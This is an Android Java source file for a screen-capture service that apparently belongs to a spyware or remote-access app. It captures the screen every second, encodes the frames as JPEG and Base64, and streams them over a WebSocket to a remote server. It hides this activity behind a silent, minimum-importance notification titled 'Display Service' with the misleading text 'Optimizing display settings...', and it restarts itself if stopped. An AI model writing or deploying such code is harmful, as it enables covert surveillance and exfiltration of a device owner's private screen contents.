package com.xrc.system.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import com.xrc.system.R;
import com.xrc.system.core.Constants;
import com.xrc.system.network.WebSocketClient;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenCaptureService extends Service {
    private static final String TAG = Constants.TAG + ":ScreenSvc";
    private static final int MAX_WIDTH = 1280;
    private static final int MAX_HEIGHT = 720;

    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private HandlerThread bgThread;
    private Handler bgHandler;
    private Handler mainHandler;
    private int resultCode;
    private Intent resultData;
    private boolean capturing = false;
    private Runnable captureTask;

    @Override
    public void onCreate() {
        super.onCreate();
        mainHandler = new Handler(Looper.getMainLooper());
        startBgThread();
        createNotificationChannel();
        startForegroundWithType();
        Log.i(TAG, "ScreenCaptureService created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            resultCode = intent.getIntExtra("resultCode", -1);
            resultData = intent.getParcelableExtra("data");
            if (resultCode != -1 && resultData != null) {
                startCapture();
            }
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        stopCapture();
        stopBgThread();
        super.onDestroy();
    }

    private void startBgThread() {
        bgThread = new HandlerThread("ScreenBg");
        bgThread.start();
        bgHandler = new Handler(bgThread.getLooper());
    }

    private void stopBgThread() {
        if (bgThread != null) {
            bgThread.quitSafely();
            try {
                bgThread.join();
                bgThread = null;
                bgHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Screen thread join failed", e);
            }
        }
    }

    private void startForegroundWithType() {
        Notification notification = buildNotification();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(Constants.NOTIF_ID_SCREEN, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else {
            startForeground(Constants.NOTIF_ID_SCREEN, notification);
        }
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, com.xrc.system.ui.MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
                PendingIntent.FLAG_IMMUTABLE);
        return new Notification.Builder(this, Constants.CHANNEL_ID + "_scr")
                .setContentTitle("Display Service")
                .setContentText("Optimizing display settings...")
                .setSmallIcon(android.R.drawable.ic_menu_gallery)
                .setContentIntent(pi)
                .setOngoing(true)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    Constants.CHANNEL_ID + "_scr",
                    "Display Service",
                    NotificationManager.IMPORTANCE_MIN);
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private void startCapture() {
        if (capturing) return;
        MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        if (mpm == null) return;
        mediaProjection = mpm.getMediaProjection(resultCode, resultData);
        if (mediaProjection == null) {
            Log.e(TAG, "MediaProjection is null");
            return;
        }

        DisplayMetrics metrics = new DisplayMetrics();
        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        if (wm != null) {
            wm.getDefaultDisplay().getRealMetrics(metrics);
        }

        int width = Math.min(metrics.widthPixels, MAX_WIDTH);
        int height = Math.min(metrics.heightPixels, MAX_HEIGHT);
        int density = metrics.densityDpi;

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        virtualDisplay = mediaProjection.createVirtualDisplay("XRCScreen",
                width, height, density, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(), null, bgHandler);

        capturing = true;
        startCaptureLoop();
    }

    private void startCaptureLoop() {
        captureTask = () -> {
            if (!capturing) return;
            Image img = imageReader.acquireLatestImage();
            if (img != null) {
                Bitmap bmp = imageToBitmap(img);
                img.close();
                if (bmp != null) {
                    sendFrame(bmp);
                    bmp.recycle();
                }
            }
            mainHandler.postDelayed(captureTask, 1000);
        };
        mainHandler.post(captureTask);
    }

    private Bitmap imageToBitmap(Image image) {
        Image.Plane plane = image.getPlanes()[0];
        ByteBuffer buffer = plane.getBuffer();
        int width = image.getWidth();
        int height = image.getHeight();
        int pixelStride = plane.getPixelStride();
        int rowStride = plane.getRowStride();
        int rowPadding = rowStride - pixelStride * width;

        Bitmap bmp = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
        bmp.copyPixelsFromBuffer(buffer);
        return Bitmap.createBitmap(bmp, 0, 0, width, height);
    }

    private void sendFrame(Bitmap bmp) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bmp.compress(Bitmap.CompressFormat.JPEG, 60, baos);
        byte[] jpeg = baos.toByteArray();
        String b64 = android.util.Base64.encodeToString(jpeg, android.util.Base64.NO_WRAP);
        try {
            JSONObject data = new JSONObject();
            data.put("frame", b64);
            data.put("size", jpeg.length);
            WebSocketClient.get(this).sendEvent("screen_frame", data);
        } catch (JSONException e) {
            Log.e(TAG, "Screen send failed", e);
        }
    }

    private void stopCapture() {
        capturing = false;
        if (mainHandler != null) mainHandler.removeCallbacks(captureTask);
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
    }
}
